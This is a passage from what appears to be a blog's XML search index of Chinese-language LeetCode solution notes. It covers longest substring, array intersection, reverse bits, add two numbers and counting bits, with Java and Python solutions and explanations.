<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;pwwkew&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: The answer is &quot;wke&quot;, with the length of 3. </span><br><span class="line">             Note that the answer must be a substring, &quot;pwke&quot; is a subsequence and not a substring.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>滑动窗口题，类似于LeetCode 76. Minimum Window Substring。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span> || s.length() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n = s.length();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 哈希表</span></span><br><span class="line">    <span class="keyword">int</span>[] map = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">128</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 左右指针 </span></span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 最长子字符串</span></span><br><span class="line">    <span class="keyword">int</span> maxLength = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 左右字符</span></span><br><span class="line">    <span class="keyword">char</span> cr, cl;</span><br><span class="line">    <span class="keyword">while</span> (r &lt; n) &#123;</span><br><span class="line">        cr = s.charAt(r);</span><br><span class="line">        map[cr]++;</span><br><span class="line">        <span class="comment">// 子字符串不重复，满足要求</span></span><br><span class="line">        <span class="keyword">if</span> (map[cr] == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 子字符串长度是否比目前发现的最长字符串还长？</span></span><br><span class="line">            <span class="keyword">if</span> (r - l + <span class="number">1</span> &gt; maxLength)</span><br><span class="line">                maxLength = r - l + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 移动左指针，直到不重复</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                cl = s.charAt(l);</span><br><span class="line">                map[cl]--;</span><br><span class="line">                l++;</span><br><span class="line">                <span class="keyword">if</span> (cl == cr) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        r++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxLength;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[349. Intersection of Two Arrays]]></title>
      <url>/wiki/2017/10/10/Leetcode-349-Intersection-of-Two-Arrays/</url>
      <content type="html"><![CDATA[<p>Given two arrays, write a function to compute their intersection.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums1 = [1,2,2,1], nums2 = [2,2]</span><br><span class="line">Output: [2]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums1 = [4,9,5], nums2 = [9,4,9,8,4]</span><br><span class="line">Output: [9,4]</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Each element in the result must be unique.</span><br><span class="line">The result can be in any order.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>使用两个HashSet.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] intersection(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">    Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;(), resSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums1)</span><br><span class="line">        set.add(num);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums2)</span><br><span class="line">        <span class="keyword">if</span> (set.contains(num)) </span><br><span class="line">            resSet.add(num);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> [] res = <span class="keyword">new</span> <span class="keyword">int</span>[resSet.size()];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Integer num : resSet)</span><br><span class="line">        res[i++] = num;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[190. Reverse Bits]]></title>
      <url>/wiki/2017/10/10/Leetcode-190-Reverse-Bits/</url>
      <content type="html"><![CDATA[<p>Reverse bits of a given 32 bits unsigned integer.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: 43261596</span><br><span class="line">Output: 964176192</span><br><span class="line">Explanation: 43261596 represented in binary as 00000010100101000001111010011100, </span><br><span class="line">             return 964176192 represented in binary as 00111001011110000010100101000000.</span><br></pre></td></tr></table></figure>
<p>Follow up:</p>
<ul>
<li>If this function is called many times, how would you optimize it?</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目没有什么特别难的地方，考察的是基本的位操作。主要过程为遍历二进制数字，依次交换头尾二进制位。关键有两点:</p>
<ol>
<li>取出二进制的任意一位</li>
<li>改变二进制的任意一位</li>
</ol>
<p>取出二进制的任意一位的方法是将$n$右移$i$位，和1按位与:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(n &gt;&gt;&gt; i) &amp; <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>将某一位强制转换为1:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value = value | <span class="number">0x01</span>;  <span class="comment">//将 bit0 强制转换为1  (假设最低位称为bit0,然后是bit1, bit2...,下同）</span></span><br><span class="line">value = value | <span class="number">0x80</span>;  <span class="comment">//将 bit7 强制转换为1</span></span><br><span class="line">value = value | (<span class="number">0x01</span> &lt;&lt; N); <span class="comment">//将 bitN 强制转换为1</span></span><br></pre></td></tr></table></figure>
<p>将某一位强制转换为0:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value = value &amp; <span class="number">0xfe</span>; <span class="comment">//将 bit0 强制转换0</span></span><br><span class="line">value = value &amp; <span class="number">0x7f</span>; <span class="comment">//将 bit7 强制转换成0</span></span><br><span class="line">value = value &amp; (~(<span class="number">0x01</span> &lt;&lt; N)); <span class="comment">//将 bitN 强制转换成0</span></span><br></pre></td></tr></table></figure>
<p>如果了解这些基本操作，这道题目就非常简单了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">31</span> - i;</span><br><span class="line">        <span class="keyword">int</span> lowBit = n &gt;&gt;&gt; i &amp; <span class="number">1</span>;          <span class="comment">// 取出第i位</span></span><br><span class="line">        <span class="keyword">int</span> highBit = n &gt;&gt;&gt; j &amp; <span class="number">1</span>;         <span class="comment">// 取出第32-i位</span></span><br><span class="line">        <span class="comment">// 交换</span></span><br><span class="line">        <span class="keyword">if</span> (lowBit == highBit) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (highBit == <span class="number">0</span>) &#123;</span><br><span class="line">            n &amp;= ~(<span class="number">1</span> &lt;&lt; i);                 <span class="comment">// lowBit转换为0</span></span><br><span class="line">            n |= <span class="number">1</span> &lt;&lt; j;              <span class="comment">// highBit转换为1</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            n |= <span class="number">1</span> &lt;&lt; i;                   <span class="comment">// lowBit转换为1</span></span><br><span class="line">            n &amp;= ~(<span class="number">1</span> &lt;&lt; j);          <span class="comment">// highBit转换为0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一种方法是将反转的数字存在另一个数当中，省去了交换，依次从该二进制数中取出最低位，然后放到另一个数当中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        result += n &amp; <span class="number">1</span>;  <span class="comment">// 取出第i位数字</span></span><br><span class="line">        n &gt;&gt;&gt;= <span class="number">1</span>;   </span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">31</span>) <span class="comment">// 对于最后一位数字，不能右移</span></span><br><span class="line">            result &lt;&lt;= <span class="number">1</span>;  <span class="comment">// 结果右移一位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种方法慢一些。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Bit Manipulation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2. Add Two Numbers]]></title>
      <url>/wiki/2017/10/10/Leetcode-2-Add-Two-Numbers/</url>
      <content type="html"><![CDATA[<p>You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return it as a linked list.</p>
<p>You may assume the two numbers do not contain any leading zero, except the number 0 itself.</p>
<p>Example</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 0 -&gt; 8</span><br><span class="line">Explanation: 342 + 465 = 807.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>题目思路是非常直接的，难点在于考虑进位的情况。首先正常操作加法，直到有一个数加完了。然后将链表指向剩余的那个数。但是有可能还有进位，所以要将剩余的数加上1，更新后面的链表。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">ListNode root = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">ListNode cur = root;</span><br><span class="line"><span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最高有效位为min(l1, l2)</span></span><br><span class="line"><span class="keyword">while</span> (l1 != <span class="keyword">null</span> &amp;&amp; l2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> num = l1.val + l2.val + carry;</span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">9</span>) &#123;</span><br><span class="line">        num -= <span class="number">10</span>; carry = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> carry = <span class="number">0</span>;</span><br><span class="line">    cur.next = <span class="keyword">new</span> ListNode(num);</span><br><span class="line">    cur = cur.next; l1 = l1.next; l2 = l2.next;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 补上后面的</span></span><br><span class="line"><span class="keyword">if</span> (l1 == <span class="keyword">null</span>) cur.next = l2;</span><br><span class="line"><span class="keyword">else</span> cur.next = l1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//carry != 0</span></span><br><span class="line">ListNode prev = cur;</span><br><span class="line">cur = cur.next;</span><br><span class="line"><span class="keyword">while</span> (cur != <span class="keyword">null</span> &amp;&amp; carry != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> num = cur.val + carry;</span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">9</span>) &#123;</span><br><span class="line">        num -= <span class="number">10</span>; carry = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> carry = <span class="number">0</span>;</span><br><span class="line">    cur.val = num;</span><br><span class="line">    prev = cur;</span><br><span class="line">    cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (carry == <span class="number">1</span>) prev.next = <span class="keyword">new</span> ListNode(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> root.next;</span><br></pre></td></tr></table></figure>
<p>另一种方法是始终生成新的链表节点。由于新的节点等于链表1的节点，加上链表2的节点，加上进位，所以当链表1或者链表2加完以后，省去该步骤。该方法看起来比较统一、简洁，不用额外处理进位。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">    ListNode root = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">    ListNode cur = root;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最高有效位为min(l1, l2)</span></span><br><span class="line">    <span class="keyword">while</span> (l1 != <span class="keyword">null</span> || l2 != <span class="keyword">null</span> || carry !=<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (l1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            num = l1.val;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            num += l2.val;</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        num += carry;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">9</span>) &#123;</span><br><span class="line">            num -= <span class="number">10</span>; carry = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> carry = <span class="number">0</span>;</span><br><span class="line">        cur.next = <span class="keyword">new</span> ListNode(num);</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>与Java的方法2相同。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        carry = <span class="number">0</span> <span class="comment"># 处理技巧1: 使用carry</span></span><br><span class="line">        root = ln = ListNode(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">or</span> l2 <span class="keyword">or</span> carry:</span><br><span class="line">            l1val = l2val = <span class="number">0</span>  <span class="comment"># 初始化l1val和l2val</span></span><br><span class="line">            <span class="keyword">if</span> l1:</span><br><span class="line">                l1val = l1.val</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">if</span> l2:</span><br><span class="line">                l2val = l2.val</span><br><span class="line">                l2 = l2.next</span><br><span class="line">            carry, val = divmod(l1val+l2val+carry, <span class="number">10</span>) <span class="comment">#divmod return quotient and reminder</span></span><br><span class="line"></span><br><span class="line">            ln.next = ListNode(val)</span><br><span class="line">            ln  = ln.next        </span><br><span class="line">        <span class="keyword">return</span> root.next</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[338. Counting Bits]]></title>
      <url>/wiki/2017/10/10/Leetcode-338-Counting-Bits/</url>
      <content type="html"><![CDATA[<p>Given a non negative integer number <strong>num</strong>. For every numbers $i$ in the range <strong>0 ≤ i ≤ num</strong> calculate the number of 1’s in their binary representation and return them as an array.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2</span><br><span class="line">Output: [0,1,1]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 5</span><br><span class="line">Output: [0,1,1,2,1,2]</span><br></pre></td></tr></table></figure>
<p><strong>Follow up</strong>:</p>
<ul>
<li>It is very easy to come up with a solution with run time $O(n*\text{sizeof(integer}))$. But can you do it in linear time $O(n)$ /possibly in a single pass?</li>
<li>Space complexity should be $O(n)$.</li>
<li>Can you do it like a boss? Do it without using any builtin function like <code>__builtin_popcount</code> in c++ or in any other language.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>首先肯定是最直接的方法：依次求出每个数的二进制表示中1的个数，时间复杂度是$O(n\log n)$：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> num) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[num + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; res.length; i++)</span><br><span class="line">        res[i] = numbits(i);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">numbits</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        count += num &amp; <span class="number">1</span>;</span><br><span class="line">        num &gt;&gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是题目又说了，有没有更优的算法的时间和空间复杂度只有线性$O(n)$？既然只有线性，肯定是只有遍历一遍了，而且肯定需要利用前面的结果，也就是说很有可能利用到动态规划。设想一下当前数字$i$的二进制表示中有$k$位数，那么最低$k-1$位数的增加过程其实已经出现在前面增加的过程中，只不过最高位–第$k$位多了一个1而已。为了尽一步验证，尝试把最直接方法得到的res打印出来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (res[i] == <span class="number">1</span>) System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">    System.out.print(String.format(<span class="string">"(%d)%2d, "</span>, i, res[i]));</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"\n"</span>);</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(0) 0, </span><br><span class="line">(1) 1, </span><br><span class="line">(2) 1, (3) 2, </span><br><span class="line">(4) 1, (5) 2, (6) 2, (7) 3, </span><br><span class="line">(8) 1, (9) 2, (10) 2, (11) 3, (12) 2, (13) 3, (14) 3, (15) 4,</span><br></pre></td></tr></table></figure>
<p>证明猜想是对的。那么代码的思路非常明显了：第$k$排数字等于前面的所有数字加1!</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> num) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[num + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>, row = <span class="number">1</span>, j = <span class="number">0</span>; i &lt; res.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == row) &#123; row *= <span class="number">2</span>; j = <span class="number">0</span>; &#125;</span><br><span class="line">        res[i] = res[j++] + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后来在论坛上发现同样简单的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f[n] = f[n去除最后一位数字] + 最后一位数字</span><br><span class="line">f[i] = f[i &gt;&gt; 1] + (i &amp; 1)</span><br></pre></td></tr></table></figure>
<p>用代码表示为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> num) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] f = <span class="keyword">new</span> <span class="keyword">int</span>[num + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=num; i++) f[i] = f[i &gt;&gt; <span class="number">1</span>] + (i &amp; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Bit Manipulation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[200. Number of Islands]]></title>
      <url>/wiki/2017/10/10/Leetcode-200-Number-of-Islands/</url>
      <content type="html"><![CDATA[<p>Given a 2d grid map of <code>&#39;1&#39;</code>s (land) and <code>&#39;0&#39;</code>s (water), count the number of islands. An island is surrounded by water and is formed by connecting adjacent lands horizontally or vertically. You may assume all four edges of the grid are all surrounded by water.</p>
<p>Example 1:</p>
